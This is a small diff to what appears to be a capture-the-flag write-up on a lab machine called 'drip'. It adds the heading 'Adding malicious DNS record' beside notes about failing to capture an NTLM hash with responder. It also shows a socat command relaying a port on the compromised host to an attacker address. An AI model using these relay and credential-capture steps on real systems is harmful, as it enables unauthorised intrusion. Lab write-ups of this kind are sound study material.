@@ -798,6 +798,8 @@ Its also not possible to add a DNS record in this situation for my own machine u
 
 So i cannot capture the NTLM hash of the user using responder
 
+# Adding malicious DNS record
+
 ```python
 ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80
 ```
